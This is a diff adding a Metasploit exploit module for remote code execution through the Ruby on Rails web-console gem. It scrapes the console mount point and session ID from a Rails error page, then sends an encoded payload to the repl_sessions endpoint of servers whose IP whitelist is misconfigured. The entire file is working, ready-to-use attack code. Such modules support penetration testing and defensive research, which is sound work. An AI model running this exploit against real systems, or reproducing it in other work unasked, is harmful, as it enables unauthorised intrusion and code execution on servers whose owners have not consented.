@@ -1,0 +1,87 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Ruby on Rails Development Web Console (v2) Code Execution',
+      'Description'    => %q{
+          This module exploits a remote code execution feature of the Ruby on Rails
+        framework. This feature is exposed if the config.web_console.whitelisted_ips
+        setting includes untrusted IP ranges and the web-console gem is enabled.
+      },
+      'Author'         => ['hdm'],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'URL', 'https://github.com/rails/web-console' ]
+        ],
+      'Platform'       => 'ruby',
+      'Arch'           => ARCH_RUBY,
+      'Privileged'     => false,
+      'Targets'        => [ ['Automatic', {} ] ],
+      'DefaultOptions' => { 'PrependFork' => true },
+      'DisclosureDate' => 'May 2 2016',
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        Opt::RPORT(3000),
+        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', '/missing404' ])
+      ], self.class)
+  end
+
+  #
+  # Identify the web console path and session ID, then inject code with it
+  #
+  def exploit
+    res = send_request_cgi({
+      'uri'     => normalize_uri(target_uri.path),
+      'method'  => 'GET'
+    }, 25)
+
+    unless res
+      print_error("Error: No response requesting #{datastore['TARGETURI']}")
+      return
+    end
+
+    unless res.body.to_s =~ /data-mount-point='([^']+)'/
+      if res.body.to_s.index('Application Trace') && res.body.to_s.index('Toggle session dump')
+        print_error('Error: The web console is either disabled or you are not in the whitelisted scope')
+      else
+        print_error("Error: No rails stack trace found requesting #{datastore['TARGETURI']}")
+      end
+      return
+    end
+
+    console_path = normalize_uri($1, 'repl_sessions')
+
+    unless res.body.to_s =~ /data-session-id='([^']+)'/
+      print_error("Error: No session id found requesting #{datastore['TARGETURI']}")
+      return
+    end
+
+    session_id = $1
+
+    print_status("Sending payload to #{console_path}/#{session_id}")
+    res = send_request_cgi({
+      'uri'       => normalize_uri(console_path, session_id),
+      'method'    => 'PUT',
+      'headers'   => {
+        'Accept'           => 'application/vnd.web-console.v2',
+        'X-Requested-With' => 'XMLHttpRequest'
+      },
+      'vars_post' => {
+        'input' => payload.encoded
+      }
+    }, 25)
+  end
+end
